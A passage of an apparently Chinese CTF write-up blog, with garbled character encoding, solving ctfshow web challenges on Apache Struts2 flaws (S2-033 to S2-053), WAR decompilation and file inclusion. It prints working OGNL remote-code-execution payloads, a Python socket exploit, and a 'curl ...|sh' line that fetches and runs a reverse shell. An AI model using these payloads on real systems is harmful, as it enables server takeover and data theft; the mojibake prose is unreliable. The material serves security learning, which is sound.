title="web291-S2-033"></a>web291-S2-033</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223214556408.png" alt="image-20230223214556408"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å½“å¼€å¯åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼Œå¹¶ä¸”åŒæ—¶ä½¿ç”¨äº†Strut2 REST Pluginæ’ä»¶æ—¶ï¼Œä½¿ç”¨â€œ!â€æ“ä½œç¬¦è°ƒç”¨åŠ¨æ€æ–¹æ³•å¯èƒ½æ‰§è¡Œognlè¡¨è¾¾å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.20 â€“ Struts 2.3.28 (ä¸åŒ…æ‹¬ 2.3.20.3å’Œ 2.3.24.3)</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/<span class="number">4</span>/%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23xx%3d123,%23rs%<span class="number">3d</span><span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream())</span>,%23wr%<span class="number">3d</span>%23context[%23parameters.obj[<span class="number">0</span>]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=<span class="number">2908</span>&amp;command=id</span><br></pre></td></tr></table></figure><h2 id="web292-S2-037"><a href="#web292-S2-037" class="headerlink" title="web292-S2-037"></a>web292-S2-037</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223214824621.png" alt="image-20230223214824621"></p><p>æ¼æ´åŸç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å½“ä½¿ç”¨RESTæ’ä»¶å¯ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå¯ä»¥ä¼ é€’å¯ç”¨äºåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œä»»æ„ä»£ç çš„æ¶æ„è¡¨è¾¾å¼</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.20 - Struts Struts 2.3.28ï¼ˆ2.3.20.3å’Œ2.3.24.3é™¤å¤–ï¼‰</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/<span class="number">3</span>/%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23xx%3d123,%23rs%<span class="number">3d</span><span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream())</span>,%23wr%<span class="number">3d</span>%23context[%23parameters.obj[<span class="number">0</span>]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=<span class="number">2908</span>&amp;command=whoami</span><br></pre></td></tr></table></figure><h2 id="web293-S2-045"><a href="#web293-S2-045" class="headerlink" title="web293-S2-045"></a>web293-S2-045</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223220621960.png" alt="image-20230223220621960"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ä½¿ç”¨åŸºäºJakartaæ’ä»¶çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œæœ‰å¯èƒ½å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œå¯¼è‡´ç³»ç»Ÿè¢«é»‘å®¢å…¥ä¾µ</span><br><span class="line">æ¶æ„ç”¨æˆ·å¯åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶é€šè¿‡ä¿®æ”¹HTTPè¯·æ±‚å¤´ä¸­çš„Content-Typeå€¼æ¥è§¦å‘è¯¥æ¼æ´ï¼Œè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.5 â€“ Struts 2.3.31 Struts 2.5 â€“ Struts 2.5.10</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: <span class="string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;whoami&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span> boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å¾—éœ€è¦åå¼¹shell</p><h2 id="web294-S2-046"><a href="#web294-S2-046" class="headerlink" title="web294-S2-046"></a>web294-S2-046</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223221152582.png" alt="image-20230223221152582"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸s2-045ç±»ä¼¼ï¼Œä½†æ˜¯è¾“å…¥ç‚¹åœ¨æ–‡ä»¶ä¸Šä¼ çš„filenameå€¼ä½ç½®ï¼Œå¹¶éœ€è¦ä½¿ç”¨\x00æˆªæ–­</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</span><br></pre></td></tr></table></figure><p>ç”±äºéœ€è¦å‘é€ç•¸å½¢æ•°æ®åŒ…ï¼Œç®€å•ä½¿ç”¨åŸç”Ÿsocketç¼–å†™payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8080</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;your-ip&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br></pre></td></tr></table></figure><h2 id="web295-S2-048"><a href="#web295-S2-048" class="headerlink" title="web295-S2-048"></a>web295-S2-048</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223224111641.png" alt="image-20230223224111641"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ¼æ´ä¸»è¦é—®é¢˜å‡ºåœ¨struts2-struts1-pluginè¿™ä¸ªæ’ä»¶åŒ…ä¸Šã€‚è¿™ä¸ªåº“çš„ä¸»è¦ä½œç”¨å°±æ˜¯å°†struts1çš„actionå°è£…æˆstruts2çš„actionä»¥ä¾¿å®ƒèƒ½åœ¨strut2ä¸Šè¿è¡Œä½¿ç”¨</span><br><span class="line">è€Œç”±äºstruts2-struts1-plugin åŒ…ä¸­çš„ â€œStruts1Action.javaâ€ ä¸­çš„ execute å‡½æ•°å¯ä»¥è°ƒç”¨ getText() å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åˆšå¥½åˆèƒ½æ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼ŒåŒæ—¶è¿™ä¸ª getText() çš„ å‚æ•°è¾“å…¥ç‚¹ï¼Œåˆå¯ä»¥è¢«ç”¨æˆ·ç›´æ¥è¿›è¡Œæ§åˆ¶ï¼Œå¦‚æœè¿™ä¸ªç‚¹è¢«æ¶æ„æ”»å‡»è€…æ‰€æ§åˆ¶ï¼Œå°±å¯ä»¥æ„é€ æ¶æ„æ‰§è¡Œä»£ç ï¼Œä»è€Œå®ç°ä¸€ä¸ªRCEæ”»å‡»</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.32</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230223224214133.png" alt="image-20230223224214133"></p><p>ä»¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ”»å‡»ç‚¹ï¼Œåœ¨å…¶æ‰§è¡ŒOGNLè¯­æ³•ï¼Œ${10-7}ï¼Œç‚¹å‡»submit</p><p><img src="../images/image-20230223224230773.png" alt="image-20230223224230773"></p><p><img src="../images/image-20230223224302364.png" alt="image-20230223224302364"></p><p>æˆåŠŸæ‰§è¡Œäº†</p><p>å€Ÿç”¨S2-045çš„æ²™ç›’ç»•è¿‡æ–¹æ³•ï¼Œæ”¹äº†ä¸€ä¸ªPOCã€‚å°†å¦‚ä¸‹POCå¡«å…¥è¡¨å•<code>Gengster Name</code>ä¸­ï¼Œæäº¤å³å¯ç›´æ¥å›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>).(#q)&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230223225251474.png" alt="image-20230223225251474"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨s2-045pocï¼ŒæŠ“åŒ…ä¿®æ”¹content-type</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(#ros=(<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getOutputStream())).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@copy(#process.getInputStream(),#ros)</span>).(#ros.flush())&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web296-S2-052"><a href="#web296-S2-052" class="headerlink" title="web296-S2-052"></a>web296-S2-052</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223225504667.png" alt="image-20230223225504667"></p><p><strong>æ¼æ´åŸç†</strong></p><p><img src="../images/image-20230223225531458.png" alt="image-20230223225531458"></p><p>è¿˜æ˜¯å¾—ç”¨å·¥å…·ï¼Œä½†æ˜¯å¾—åå¼¹shellï¼Œå› ä¸ºenvå¤ªé•¿äº†ï¼Œæœ‰é•¿åº¦é™åˆ¶ï¼Œåªè¾“å‡ºåŠæˆª</p><p><img src="../images/image-20230223225835015.png" alt="image-20230223225835015"></p><p>è¿™é‡Œçš„è¯å¾—éœ€è¦s2-045æ¼æ´</p><h2 id="web297-S2-053"><a href="#web297-S2-053" class="headerlink" title="web297-S2-053"></a>web297-S2-053</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223230033073.png" alt="image-20230223230033073"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts2åœ¨ä½¿ç”¨Freemarkeræ¨¡æ¿å¼•æ“çš„æ—¶å€™ï¼ŒåŒæ—¶å…è®¸è§£æOGNLè¡¨è¾¾å¼ã€‚å¯¼è‡´ç”¨æˆ·è¾“å…¥çš„æ•°æ®æœ¬èº«ä¸ä¼šè¢«OGNLè§£æï¼Œä½†ç”±äºè¢«Freemarkerè§£æä¸€æ¬¡åå˜æˆç¦»å¼€ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¢«OGNLè§£æç¬¬äºŒæ¬¡ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(#process.getInputStream())</span>)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å¾—åå¼¹shell.</p><p>å°±æ˜¯å…ˆåˆ©ç”¨å·¥å…·ï¼ŒæŸ¥æ‰¾å­˜åœ¨å“ªäº›æ¼æ´ï¼Œç„¶åå°±å»åˆ©ç”¨æ‰§è¡Œè¿™ä¸ªæ¼æ´ï¼Œç„¶åå°±è¾“å…¥ä¸‹é¢çš„curlå‘½ä»¤å°±å¯ä»¥äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/ä½ çš„å…¬ç½‘ipå†’å·ä½ çš„å¼€æ”¾ç«¯å£ç©ºæ ¼|sh</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯åå¼¹shellçš„æ–¹æ³•ï¼Œå…¶å®è¿˜æœ‰å¾ˆå¤šç§è¯­è¨€çš„åå¼¹shellçš„æ–¹æ³•</p><p>your-shell â€”â€”&gt;è¿™ä¸ªæ˜¯åå¼¹å·¥å…·ç½‘å€</p><p>åœ¨bç«™çš„  <a href="https://www.bilibili.com/video/BV13P4y1M7EF/?spm_id_from=333.337.search-card.all.click&amp;vd_source=bacfffe46b930fda5761b63367eb298c">åå¼¹shellè®²è§£</a> </p><h2 id="web298-åç¼–è¯‘"><a href="#web298-åç¼–è¯‘" class="headerlink" title="web298-åç¼–è¯‘"></a>web298-åç¼–è¯‘</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223231242469.png" alt="image-20230223231242469"></p><p><strong>é¢˜ç›®é™„ä»¶ä¸€ä¸ªwaråŒ…</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jaråŒ…å’ŒwaråŒ…éƒ½å¯ä»¥çœ‹æˆå‹ç¼©æ–‡ä»¶ï¼Œéƒ½å¯ä»¥ç”¨è§£å‹è½¯ä»¶æ‰“å¼€ï¼ŒjaråŒ…å’ŒwaråŒ…éƒ½æ˜¯ä¸ºäº†é¡¹ç›®çš„éƒ¨ç½²å’Œå‘å¸ƒï¼Œé€šå¸¸åœ¨æ‰“åŒ…éƒ¨ç½²çš„æ—¶å€™ï¼Œä¼šåœ¨é‡Œé¢åŠ ä¸Šéƒ¨ç½²çš„ç›¸å…³ä¿¡æ¯ã€‚è¿™ä¸ªæ‰“åŒ…å®é™…ä¸Šå°±æ˜¯æŠŠä»£ç å’Œä¾èµ–çš„ä¸œè¥¿å‹ç¼©åœ¨ä¸€èµ·ï¼Œå˜æˆåç¼€åä¸º.jarå’Œ.warçš„æ–‡ä»¶ï¼Œå°±æ˜¯æˆ‘ä»¬è¯´çš„jaråŒ…å’ŒwaråŒ…ã€‚ä½†æ˜¯è¿™ä¸ªâ€œå‹ç¼©åŒ…â€å¯ä»¥è¢«ç¼–è¯‘å™¨ç›´æ¥ä½¿ç”¨ï¼ŒæŠŠwaråŒ…æ”¾åœ¨tomcatç›®å½•çš„webappä¸‹ï¼ŒtomcatæœåŠ¡å™¨åœ¨å¯åŠ¨çš„æ—¶å€™å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªwaråŒ…ã€‚é€šå¸¸tomcatçš„åšæ³•æ˜¯è§£å‹ï¼Œç¼–è¯‘é‡Œé¢çš„ä»£ç ï¼Œæ‰€ä»¥å½“æ–‡ä»¶å¾ˆå¤šçš„æ—¶å€™ï¼Œtomcatçš„å¯åŠ¨ä¼šå¾ˆæ…¢ã€‚</span><br><span class="line"></span><br><span class="line">jaråŒ…å’ŒwaråŒ…çš„åŒºåˆ«ï¼šjaråŒ…æ˜¯javaæ‰“çš„åŒ…ï¼ŒwaråŒ…å¯ä»¥ç†è§£ä¸ºjavawebæ‰“çš„åŒ…ï¼Œè¿™æ ·ä¼šæ¯”è¾ƒå¥½è®°ã€‚jaråŒ…ä¸­åªæ˜¯ç”¨javaæ¥å†™çš„é¡¹ç›®æ‰“åŒ…æ¥çš„ï¼Œé‡Œé¢åªæœ‰ç¼–è¯‘åçš„classå’Œä¸€äº›éƒ¨ç½²æ–‡ä»¶ã€‚è€ŒwaråŒ…é‡Œé¢çš„ä¸œè¥¿å°±å…¨äº†ï¼ŒåŒ…æ‹¬å†™çš„ä»£ç ç¼–è¯‘æˆçš„classæ–‡ä»¶ï¼Œä¾èµ–çš„åŒ…ï¼Œé…ç½®æ–‡ä»¶ï¼Œæ‰€æœ‰çš„ç½‘ç«™é¡µé¢ï¼ŒåŒ…æ‹¬htmlï¼Œjspç­‰ç­‰ã€‚ä¸€ä¸ªwaråŒ…å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªwebé¡¹ç›®ï¼Œé‡Œé¢æ˜¯é¡¹ç›®çš„æ‰€æœ‰ä¸œè¥¿ã€‚</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å·¥å…·<a href="https://github.com/java-decompiler/jd-gui/releases">Java decompiler</a>åç¼–è¯‘classæ–‡ä»¶</p><p><img src="../images/image-20230224191707065.png" alt="image-20230224191707065"></p><p><img src="../images/image-20230224191718054.png" alt="image-20230224191718054"></p><p>æŸ¥çœ‹æºç å‘ç°ä¸¤ä¸ªå‡½æ•°ï¼Œåªè¦username=admin&amp;password=ctfshowçš„è¯ï¼Œè¿™ä¸ªå‡½æ•°å°±ä¼šè¿”å›true,ç„¶åå°±ä¼šæ‰“å°flag.</p><h2 id="web299-æ–‡ä»¶è¯»å–"><a href="#web299-æ–‡ä»¶è¯»å–" class="headerlink" title="web299-æ–‡ä»¶è¯»å–"></a>web299-æ–‡ä»¶è¯»å–</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230224201233523.png" alt="image-20230224201233523"></p><p>å‘ç°äº†ä¸€ä¸ªé¢˜ç›®ç»™çš„æ³¨é‡Šï¼Œç„¶åå»å°è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–çš„ã€‚</p><p>è¿™é‡Œçš„è¯ç»™çš„æ˜¯phpï¼Œä½†æ˜¯åœ¨javaä¸­ï¼Œé»˜è®¤çš„æ–‡ä»¶åº”è¯¥æ˜¯<code>index.jsp</code></p><p><img src="../images/image-20230224201453984.png" alt="image-20230224201453984"></p><p>å»è¯»WEB-INF/web.xmlï¼Œå‘ç°å­˜åœ¨con.ctfshow.servlet.GetFlag</p><p><img src="../images/image-20230224201722256.png" alt="image-20230224201722256"></p><p>è¿™ä¸ªè·¯å¾„æ˜¯æ ¹æ®ä¸Šä¸€é¢˜çš„javaæ–‡ä»¶å¾—å‡ºçš„  <strong>ä¸€èˆ¬æ¥è¯´ web.xmléƒ½æ˜¯åœ¨è¿™ä¸ªè·¯å¾„ä¸‹</strong></p><p>è¿™é‡Œçš„ <strong>web.xml</strong>  å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« æ¥è¿›è¡Œå­¦ä¹ å­¦ä¹   <a href="https://www.cnblogs.com/linhuaming/p/9464356.html">æ–‡ç« </a></p><p>è¿›è¡Œ web.xmlçš„è¯»å–</p><p><img src="../images/image-20230224202057625.png" alt="image-20230224202057625"></p><p>ç„¶åè¿›è¡Œè¯»å–WEB-INF/classes/com/ctfshow/servlet/GetFlag.classï¼Œå› ä¸ºæ˜¯classæ–‡ä»¶å­—ç¬¦æœ‰ç‚¹ä¹±ï¼Œå‘ç°fl3g</p><p>è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªè·¯å¾„çš„è¯ï¼Œæ˜¯å› ä¸ºä¸Šä¸€é¢˜çš„javaå‹ç¼©åŒ…é‡Œçš„è·¯å¾„ï¼Œç„¶åå°±æ ¹æ®å…¶æ¨æ–­å‡ºã€‚</p><p><img src="../images/image-20230224202206393.png" alt="image-20230224202206393"></p><p>ä½†æ˜¯   æ˜¯ä¸æ˜¯æ‰€æœ‰çš„é»˜è®¤æ–‡ä»¶éƒ½æ˜¯è¿™ä¸ªè·¯å¾„çš„è¯æˆ‘å°±ä¸çŸ¥é“äº†ï¼Œå› ä¸ºåˆšå¼€å§‹å­¦java</p><p><img src="../images/image-20230224202349505.png" alt="image-20230224202349505"></p><p>å‘ç°è¿™ä¸ªflagæ‰€åœ¨çš„æ–‡ä»¶</p><p>ç„¶åè¿›è¡Œè¯»å–</p><p><img src="../images/image-20230224202445941.png" alt="image-20230224202445941"></p><h2 id="web300-æ–‡ä»¶è¯»å–"><a href="#web300-æ–‡ä»¶è¯»å–" class="headerlink" title="web300-æ–‡ä»¶è¯»å–"></a>web300-æ–‡ä»¶è¯»å–</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£é¢˜æ–¹æ³•å’Œä¸Šé¢˜ä¸€æ ·ï¼Œ</p><p><img src="../images/image-20230224202801282.png" 